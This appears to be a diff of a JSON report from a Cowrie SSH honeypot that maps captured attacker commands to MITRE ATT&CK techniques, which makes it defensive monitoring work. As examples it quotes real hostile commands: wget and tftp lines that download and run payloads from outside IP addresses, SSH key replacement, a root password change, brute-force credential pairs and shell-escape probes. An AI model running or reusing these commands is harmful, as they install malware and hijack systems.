@@ -1,18 +1,34 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-29 01:01:15",
+  "generated": "2026-09-29 02:01:45",
   "totals": {
-    "commands": 18,
-    "login_failed": 45,
-    "login_success": 1,
-    "sessions": 71
+    "commands": 263,
+    "login_failed": 64,
+    "login_success": 20,
+    "sessions": 137
   },
   "techniques": [
+    {
+      "id": "T1222.002",
+      "name": "File and Directory Permissions Modification: Linux and Mac",
+      "tactic": "Defense Evasion",
+      "count": 114,
+      "examples": [
+        "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+        "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1",
+        ">/var/.f && chmod 777 /var/.f && /var/.f && cd /var/;",
+        ">/var/tmp/.f && chmod 777 /var/tmp/.f && /var/tmp/.f && cd /var/tmp/;",
+        ">/var/run/.f && chmod 777 /var/run/.f && /var/run/.f && cd /var/run/;"
+      ],
+      "first": "2026-09-29T00:21:19.292312Z",
+      "last": "2026-09-29T01:55:41.381307Z",
+      "unique_ips": 7
+    },
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 45,
+      "count": 64,
       "examples": [
         "root / 12345Abc",
         "administrator / 1qazxsw2",
@@ -21,14 +37,45 @@
         "latoya / latoya1"
       ],
       "first": "2026-09-29T00:00:22.776997Z",
-      "last": "2026-09-29T00:49:59.204239Z",
-      "unique_ips": 6
+      "last": "2026-09-29T01:55:35.474802Z",
+      "unique_ips": 13
+    },
+    {
+      "id": "T1078",
+      "name": "Valid Accounts",
+      "tactic": "Initial Access",
+      "count": 20,
+      "examples": [
+        "root / Asdfghjk1",
+        "root / root",
+        "root / xmhdipc",
+        "root / Admin"
+      ],
+      "first": "2026-09-29T00:21:18.787089Z",
+      "last": "2026-09-29T01:55:39.274513Z",
+      "unique_ips": 8
+    },
+    {
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "tactic": "Command and Control",
+      "count": 11,
+      "examples": [
+        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
+        "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
+        "wget -O x http://23.95.228.20/dl.sh",
+        "http://23.95.228.20/dl.sh",
+        "#!/bin/sh\n\nH=23.95.228.20\ncd /tmp 2>/dev/null || cd /var/tmp 2>/dev/null || cd /dev/shm 2>/dev/null || cd .\n\nA=$(uname -"
+      ],
+      "first": "2026-09-29T00:21:20.958251Z",
+      "last": "2026-09-29T01:46:13.412385Z",
+      "unique_ips": 3
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 9,
+      "count": 10,
       "examples": [
         "cat /proc/cpuinfo | grep name | wc -l",
         "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
@@ -37,21 +84,22 @@
         "cat /proc/cpuinfo | grep model | grep name | wc -l"
       ],
       "first": "2026-09-29T00:21:27.067552Z",
-      "last": "2026-09-29T00:21:39.697665Z",
-      "unique_ips": 1
+      "last": "2026-09-29T01:45:48.371770Z",
+      "unique_ips": 2
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 2,
+      "count": 3,
       "examples": [
         "w",
-        "whoami"
+        "whoami",
+        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
       ],
       "first": "2026-09-29T00:21:33.279861Z",
-      "last": "2026-09-29T00:21:38.093384Z",
-      "unique_ips": 1
+      "last": "2026-09-29T01:45:22.519819Z",
+      "unique_ips": 2
     },
     {
       "id": "T1057",
@@ -67,29 +115,6 @@
       "unique_ips": 1
     },
     {
-      "id": "T1105",
-      "name": "Ingress Tool Transfer",
-      "tactic": "Command and Control",
-      "count": 2,
-      "examples": [],
-      "first": "2026-09-29T00:21:20.958251Z",
-      "last": "2026-09-29T00:21:29.520832Z",
-      "unique_ips": 1
-    },
-    {
-      "id": "T1222.002",
-      "name": "File and Directory Permissions Modification: Linux and Mac",
-      "tactic": "Defense Evasion",
-      "count": 2,
-      "examples": [
-        "cd ~; chattr -ia .ssh; lockr -ia .ssh",
-        "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1"
-      ],
-      "first": "2026-09-29T00:21:19.292312Z",
-      "last": "2026-09-29T00:21:20.109461Z",
-      "unique_ips": 1
-    },
-    {
       "id": "T1070.004",
       "name": "Indicator Removal: File Deletion",
       "tactic": "Defense Evasion",
@@ -99,18 +124,6 @@
       ],
       "first": "2026-09-29T00:21:28.681871Z",
       "last": "2026-09-29T00:21:28.681871Z",
-      "unique_ips": 1
-    },
-    {
-      "id": "T1078",
-      "name": "Valid Accounts",
-      "tactic": "Initial Access",
-      "count": 1,
-      "examples": [
-        "root / Asdfghjk1"
-      ],
-      "first": "2026-09-29T00:21:18.787089Z",
-      "last": "2026-09-29T00:21:18.787089Z",
       "unique_ips": 1
     },
     {
@@ -152,7 +165,75 @@
   ],
   "unmapped": [
     [
+      "/bin/busybox HISILICON",
+      24
+    ],
+    [
+      "sh",
+      17
+    ],
+    [
+      "shell",
+      17
+    ],
+    [
+      "enable",
+      17
+    ],
+    [
+      "system",
+      17
+    ],
+    [
+      "ping; sh",
+      16
+    ],
+    [
+      "/bin/busybox cat /proc/self/exe || cat /proc/self/exe",
+      8
+    ],
+    [
+      "/bin/busybox",
+      7
+    ],
+    [
       "echo \"root:NGzPwXy2UH1H\"|chpasswd|bash",
+      1
+    ],
+    [
+      "linuxshell",
+      1
+    ],
+    [
+      "enablelinuxshell",
+      1
+    ],
+    [
+      "ping ;sh",
+      1
+    ],
+    [
+      "busybox",
+      1
+    ],
+    [
+      "cd /proc && cat self/cmdline",
+      1
+    ],
+    [
+      "cd /tmp",
+      1
+    ],
+    [
+      "sh x",
+      1
+    ],
+    [
+      "<html>\r\n<head><title>404 Not Found</title></head>\r\n<body>\r\n<center><h1>404 Not Found</h1></center>\r\n<hr><center>nginx/1.",
+      1
+    ],
+    [
+      "<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad Request</h1></center>\r\n<hr><center>ngin",
       1
     ]
   ]
